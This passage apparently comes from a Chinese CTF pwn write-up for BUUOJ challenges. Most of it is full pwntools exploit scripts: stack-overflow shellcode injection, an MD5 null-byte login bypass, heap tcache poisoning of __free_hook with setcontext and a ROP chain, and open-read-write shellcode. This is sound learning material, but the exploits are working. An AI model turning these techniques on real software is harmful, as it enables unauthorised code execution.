class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25120</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./bypwn&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;well you input:&#x27;</span>) </span><br><span class="line">    sd(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">    rbp = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">    echo(<span class="string">&#x27;rbp address:&#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="comment"># sla(&#x27;EASY PWN PWN PWN~&#x27;, &#x27;a&#x27;)</span></span><br><span class="line">    ru(<span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">    shellcode_address = rbp - <span class="number">0x50</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    echo(<span class="string">&#x27;shellcode len:&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    payload = shellcode </span><br><span class="line">    payload = payload.ljust(<span class="number">0x58</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(shellcode_address)</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut5y06i9sj61gw0u00zm02.jpg" alt=""></p><p>æ‰“å¼€ä¹‹åï¼Œæˆ‘ï¼šï¼Ÿï¼Ÿï¼Ÿ</p><p>ç™»å½•ç³»ç»Ÿçœ‹äº†ä¸€ä¸‹åˆï¼Œangrè·‘è·¯å¾„ï¼Œidaé™åŠ¨è°ƒï¼ŒgdbåŠ¨è°ƒ</p><p>åæ¥ç”¨winæ‰“å¼€ï¼Œfindcryptoä¸€æŠŠæ¢­ï¼Œfindcryptoï¼Œå½³äºï¼</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut6114c05j61900du77e02.jpg" alt=""></p><p>æ‰¾åˆ°bignumberå’Œä¸‹é¢çš„å¸¸æ•°ï¼Œç‚¹è¿›å»ï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼ŒæğŸ´ï¼Œè¿™ä¸å°±æ˜¯md5</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut6mk1rxqj616g0fy77j02.jpg" alt=""></p><p>è‡ªå·±éªŒè¯äº†ä¸€æ³¢ï¼Œç¡®å®æ˜¯md5</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut62re7mrj61540bu0wf02.jpg" alt=""></p><p>è¿™å—å°±æ˜¯å¯†ğŸ´äº†ï¼Œé‚£ä¸å°±ç®€å•äº†ï¼ŒğŸ‘´ğŸ»å¾ˆå¼€å¿ƒï¼ŒğŸ‘´ğŸ»å»äº†cmd5</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut66qrzqqj61fi0k8dhr02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut67ed4uij613s0ty0yn02.jpg" style="zoom:50%;" /></p><p>å‘ƒå‘ƒï¼ŒğŸ‘´ğŸ»å¾ˆç”Ÿæ°”</p><p>å¥½å§ï¼Œå†™ä¸ªè„šæœ¬è·‘å¯†ç æ— æœåï¼Œå‘ç°è‡ªå·±æƒ³æ­ªäº†ï¼Œmd5é å•¥æ¯”å¯¹çš„ï¼Œstrcpyå•Šï¼Œ00æˆªæ–­å•Šï¼Œç¬é—´å¦‚æ¢¦åˆé†’ï¼Œç›´æ¥å†™ä¸ªå‡½æ•°çˆ†ç ´ç¬¬ä¸€ä½æ˜¯00å­—ç¬¦çš„è„šæœ¬ï¼Œç„¶ååé¢å°±æ˜¯å¸¸è§„çš„èœå•é¢˜äº†ï¼Œaddçš„æ—¶å€™å¯ä»¥æº¢å‡ºï¼Œå¼€äº†æ²™ç®±ï¼ŒåŠ«æŒ__free_hookä¸ºsetcontext + 53çš„åœ°æ–¹æ¥æ§åˆ¶å¯„å­˜å™¨ï¼Œç®€å•é¢˜ä¸èµ˜è¿°äº†</p><p>å¯¹ï¼Œè¿˜æœ‰å‡ ä¸ªå°å°çš„ç‚¹è®°å½•ä¸€ä¸‹ï¼š</p><ol><li>ida7.5å¯¹ç™»å½•çš„é€»è¾‘åç¼–è¯‘çš„ç»“æœæ›´ä¸ºæ¸…æ™°ï¼š</li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut6jrg381j316i0u0799.jpg" alt=""></p><p>ï¼ˆå½“æ—¶ç”¨ida7.0è°ƒäº†å¥½ä¹…æ‰å‘ç°æ˜¯å’Œadminä½œå¯¹æ¯”ï¼Œida7.5ç›´æ¥å‡ºäº†ï¼‰</p><ol><li><p>å¡«å¯†ç çš„æ—¶å€™åé¢è¦ç”¨00å¡«å……åˆ°0x20ï¼Œè¦ä¸ç„¶è¿‡ä¸äº†éªŒè¯</p></li><li><p>å­¦å¥½é€†å‘å¯¹pwnæ‰‹çœŸçš„å¾ˆé‡è¦ï¼ˆç•™ä¸‹äº†ä¸ä¼šé€†å‘çš„æ³ªæ°´</p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./datasystem&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc-2.27.so&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge,&#x27;b *$rebase(0x2ab1)&#x27;)</span></span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26719</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./datasystem&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt; :&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_password</span>():</span></span><br><span class="line">    all_letters = ascii_letters + digits + <span class="string">&#x27;.,;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> permutations(all_letters, i):</span><br><span class="line">            item = <span class="string">&#x27;&#x27;</span>.join(item)</span><br><span class="line">            <span class="keyword">if</span> md5(item.encode()).hexdigest()[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;00&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> item.ljust(<span class="number">0x20</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&#x27;please input username:&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">    sa(<span class="string">&#x27;please input password:&#x27;</span>, hack_password())</span><br><span class="line">    <span class="comment"># 0ea1fb4edf4aae8fb2ee19fb1cfbe362</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span>)   <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x430</span>, <span class="string">&#x27;ub&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x20</span> * <span class="string">&#x27;a&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    __free_hook = leak + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = leak + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x10</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))   <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="number">0x40</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(__free_hook))    <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    libc_base = leak</span><br><span class="line">    setcontext_door = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    syscall = libc_base + libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">    echo(<span class="string">&#x27;SYSCALL:&#x27;</span> + <span class="built_in">hex</span>(syscall))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#=========================setcontext===========================</span></span><br><span class="line"></span><br><span class="line">    fake_rsp = free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span></span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = fake_rsp</span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = fake_rsp</span><br><span class="line">    frame.rip = syscall</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(frame))))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x40</span>, p64(setcontext_door))  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    add(<span class="built_in">len</span>(<span class="built_in">str</span>(frame)), <span class="built_in">str</span>(frame)) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    layout = [</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdi; ret;</span></span><br><span class="line">    free_hook &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rsi; ret;</span></span><br><span class="line">    <span class="number">0x2000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdx; ret;</span></span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rax; ret;</span></span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    syscall, <span class="comment">#: syscall; ret;</span></span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: jmp rsp;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    sub rsp, 0x800</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    cmp eax, 0</span></span><br><span class="line"><span class="string">    js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    failed:</span></span><br><span class="line"><span class="string">    push 0x6c696166</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 4</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    exit:</span></span><br><span class="line"><span class="string">    xor edi, edi</span></span><br><span class="line"><span class="string">    mov eax, 231</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sd(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p>ä¹Ÿæ˜¯ç®€å•é¢˜ï¼Œprintfæ³„éœ²canaryï¼Œrbpå¯„å­˜å™¨å’Œlibcåœ°å€ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªå¤§è§„æ¨¡æ ˆæº¢å‡ºä¸è¿‡å¼€äº†æ²™ç®±</p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œwirteå’Œreadå‡½æ•°æ‰§è¡Œä¸äº†ï¼Œä½†æ˜¯æº¢å‡ºçš„å­—èŠ‚æ•°é‡å¾ˆå¤šå¹¶ä¸”èƒ½ç”¨libcçš„gadgetï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨syscallæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œæ³¨æ„ï¼ŒROPgadgetæ˜¯æ‰¾ä¸åˆ°<code>syscall; ret;</code>è¿™ä¸ªgadgetçš„ï¼Œè¿™ä¸ªgadgetå¾—ç”¨ropperæ¥æ‰¾</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./newlib&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge, &#x27;b *0x4007B6&#x27;)</span></span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26888</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span 